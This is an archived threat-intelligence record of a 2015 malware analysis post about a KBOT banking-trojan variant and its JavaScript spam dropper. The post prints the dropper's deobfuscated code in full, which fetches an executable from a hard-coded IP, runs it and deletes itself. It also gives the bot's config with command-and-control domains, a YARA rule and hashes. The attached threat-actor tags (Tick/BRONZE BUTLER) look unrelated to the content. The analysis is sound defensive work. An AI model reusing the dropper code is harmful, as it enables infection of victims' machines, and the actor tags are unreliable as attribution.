{
    "id": "b54705ea-94fd-4494-b4c9-35b43992e14e",
    "created_at": "2023-01-12T15:09:05.757058Z",
    "updated_at": "2025-03-27T02:06:08.024538Z",
    "deleted_at": null,
    "sha1_hash": "22580b0b8c4230dc276af6bae842894ddd0ab322",
    "title": "2015-05-17 - Newest addition to a happy family- KBOT",
    "authors": "",
    "file_creation_date": "2022-05-28T04:04:42Z",
    "file_modification_date": "2022-05-28T04:04:42Z",
    "file_size": 60785,
    "plain_text": "**[lokalhost.pl/txt/newest_addition_to_happy_family_kbot.17.05.2015.txt](https://lokalhost.pl/txt/newest_addition_to_happy_family_kbot.17.05.2015.txt)**\n\nNewest addition to a happy family: KBOT\n\n--\nAt the beginning of the May here in Poland we have couple of free days. 3rd May is Constitution\nDay, and May 1st is Labour Day.\n\nMost of us use those days to unwind after winter, but some malware authors apparently didnâ€™t: a\nfew weeks ago, our friends started a new campaign,\n\nspreading some poorly obfuscated Javascript and quite an interesting modification of KBOT from\nthe Carberp leak.\n\nSpam run.\n\n--\nIf you want to stay trendy, you have to follow the trendsetters and the in malware world these days,\nthese apparently are the Dridex and Locky gang.\n\nSince they moved to spreading JavaScriptâ€™s instead of .doc/.docm/.pdf.exe, the rest of the world\nhas followed.\n\nThe first payload is a Javascript dropper, and it doesnâ€™t do anything except download the second\nstage in a loop.\n\nThe obfuscation used here is interesting but trivial to break.\n\nI came up with this nifty one liner ;]\n\ncat Zamowienie.js | python2 -c 'import re,sys;print re.sub(r\"\\\\u00([a-f0-9]{2})\",lambda x:\nchr(int(x.group(1),16)),sys.stdin.read())' | sed -e \"s/;/;\\n/g\" | sed -e \"s/{[a-z0-9]\\+:\\('.'\\)}\\.[a-z09]\\+/\\1/g\" | sed -e\"s/'+'//g\"\n\nAnd voila!\n\nvar obj_from = this['ActiveXObject'];\n\nvar obj_thousands7 = this['WScript'];\n\nvar obj_data6 = obj_thousands7['CreateObject']('WScript.Shell');\n\nvar fso12 = new obj_from('Scripting.FileSystemObject');\n\nvar obj_numerous = new obj_from('ADODB.Stream');\n\nvar obj_hundreds2 = new obj_from('Shell.Application');\n\nvar obj_radiofrequency10 = obj_data6['ExpandEnvironmentStrings']('%TEMP%');\n\nvar obj_since = obj_radiofrequency10 + '\\\\' + Math['floor']((Math['random']() * (40 + 10 + 50)) + 1) +\n'.exe';\n\nvar obj_they = new obj_from('Msxml2.ServerXMLHTTP');\n\nvar obj_find = '\\aflash_update.js';\n\nvar obj from = obj hundreds2['NameSpace'](3 + 2 + 2);\n\n\n-----\n\nvar flagme = false;\nvar okidoki = false;\nvar tone = 1;\nvar obj_including6 = null;\nvar obj_trigger = '';\nvar obj_practitioners2 = obj_thousands7['ScriptFullNam' + {\nSc3: 'e'\n}.Sc3];\nvar obj_software = obj_from.Self.Path + obj_find;\nvar url12 = 'https://217.28.218.217/AE5600FFCBCC/q64.php?\nadd=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt';\nif ((obj_practitioners2 != obj_software) && (flagme == false)) {\nflagme = true;\nfso12['DeleteFile'](obj_practitioners2);\nobj_thousands7['echo']('The document is corrupted and cannot be opened');\nobj_thousands7['Sleep'](4000 + 4000);\n}\nwhile (true) {\ntone = tone + 1;\nif (tone == 300000000) {\nwhile (true) {\ntry {\nobj_they['setOption'](3, 'MSXML');\nobj_they['open']('GET', url12 + '&' + Math['floor']((Math['random']() * (200)) + 1), false);\nobj_they['send']();\nif (obj_they['status'] == (100 + 100)) {\nif (fso12['FileExists'](obj_since)) fso12['DeleteFile'](obj_since);\nobj_numerous['Open']();\nobj_numerous['Type'] = 1;\nobj_numerous['Write'](obj_they['responseBody']);\nobj_numerous['Position'] = 0;\nobj_numerous['SaveToFile'](obj_since);\nobj_numerous['Close']();\nobj_including6 = fso12['GetFile'](obj_since)['OpenAsTextStream'](1);\nif (fso12['FileExists'](obj_since) && obj_including6['ReadLine']()['substring'](0, 2) == 'MZ') {\nokidoki = true;\nobj_hundreds2['ShellExecute'](obj_since, '', '', 'open', '1');\nif (fso12['FileExists'](obj_thousands7['ScriptFullName'))\nfso12['DeleteFile'](obj_thousands7['ScriptFullName']);\nobj_thousands7['Sleep'](4000);\nif (fso12['FileExists'](obj_since)) fso12['DeleteFile'](obj_since);\n}\nobj_including6['Close']();\n}\n} catch (e) {}\n\n\n-----\n\nif (okidoki == true) {\nbreak;\n}\nobj_thousands7['Sleep'](10000 * 7);\n}\nbreak;\n}\n};\n\nSecond Stage, Malware.\n--\nAs mentioned above, this a KBOT spin off, and it looks like itâ€™s actively being developed and tested\nin production.\nFirst version ate my whole RAM and keeps crashing, rebooting my system.\nHowever, it improved recently, and right now after a few iterations is much more stable.\n\nKBOT originally was a very simple user-mode downloader, core of old ursnif/gozi2/isfb is my guess.\nThis malware has much more to offer tho.\n\nThings that changed:\n\n- Tor support, yet no Tor found on machine.\n\n- Removed get parameters in favour of json-encoded post data.\n\n- Much more complicated encryption schema (not fully reversed yet)\n\n- Addition of mongoose http server (why is it there?)\n\n- There are probably more changes, but I did only a preliminary analysis of this malware.\n\nWhat didnâ€™t change is how they store configuration data.\nOr maybe a just a little bit â€“ they added a big header in front `BASECONFIG......` ;]\n\nAfter that we can find typical FJ-struct,\n\n00000000 fj_struct struc ; (sizeof=0x14, mappedto_188)\n00000000 id dw ?\n00000002 field_2 dw ?\n00000004 offset dd ?\n00000008 size dd ?\n0000000C crc_tag dd ?\n00000010 flags dd ?\n00000014 fj_struct ends\n\nAnd config with crc_tag == 0xefc75d60 is stored in plain text at the beginning of .reloc section\n\n\n-----\n\n{\n\"BotConfig\":\n{\n\"ServerPub\":\"44DCF35866EB4992264E809EDD001737C65E28BB4DAB8DC7DA5CFA7F1AA05619\",\n\"TaskPeriod\": 600,\n\"FailPeriod\": 600,\n\"BotCommunity\": \"group_102\",\n\"Hosts\":\n\n[\n\"mensabuxus.net\",\n\"ogrthuvwfdcfri5euwg.com\",\n\"ogrthuvfewfdcfri5euwg.com\"\n]\n}\n}\n\nCurrent version is, 16777472 which I suppose can be transformed to 1.00.01.00 so its brand new ;]\n\nFrom other notes, it looks like itâ€™s protected by Rovnix, there is some code to accessing hidden\npartitions,\nbut it can be just leftovers from original KBOT source code, since I didnâ€™t see any Rovnix related\ncode.\nOh and this the first malware I have seen implementing proper hmac for messages, bravo!\n\nThis is just a heads-up article to inform you that there is a new interesting threat. Iâ€™m still working on\nreversing it, so further analysis will follow (hopefully ;))\n\nOne last thing as a side note, it is quite interesting to see that ISFB, the most spread banker in .pl is\nbeing replaced with something that has roots in the same Carberp leak.\nIâ€™m very curious to see which one will win the market ðŸ˜‰;]\n\nHere are some hashes and yara rule for the unpacked sample\n\nrule kbot : banker\n{\nmeta:\nauthor = \"mak\"\nmodule = \"kbot\"\n\nstrings:\n$bot_cfg = \"BASECONFIG......FJ\"\n$injini = \"INJECTS.INI\"\n$kbotini = \"KBOT.INI\"\n$bot0 = \"BotConfig\"\n$bot1 = \"BotCommunity\"\n\n\n-----\n\n$push_version = { 5? 68 [4] 68 [4] 5? E8 [4] 83 C4 10 85 C0 0F}\ncondition:\nall of them\n}\n\n62962da720d478bb3510dabc691db37df546749b440caa45d75d9fbfb69d82f9\n6e6ef05382010f857ecef17082e9c38b54133380f709b5b25e77afdcacf2b9ca\n12769a17f85a4c7d56cfe5754184db976b9a361dc7b5d2a8f50e82d7442651aa\n5eccbdae80a1c1e8cb8574986393fc958394b66978ec348d00afe3ec828d20ac\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-05-17 - Newest addition to a happy family- KBOT.pdf"
    ],
    "report_names": [
        "2015-05-17 - Newest addition to a happy family- KBOT.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536145,
    "ts_updated_at": 1743041168,
    "ts_creation_date": 1653710682,
    "ts_modification_date": 1653710682,
    "files": {
        "pdf": "https://archive.orkl.eu/22580b0b8c4230dc276af6bae842894ddd0ab322.pdf",
        "text": "https://archive.orkl.eu/22580b0b8c4230dc276af6bae842894ddd0ab322.txt",
        "img": "https://archive.orkl.eu/22580b0b8c4230dc276af6bae842894ddd0ab322.jpg"
    }
}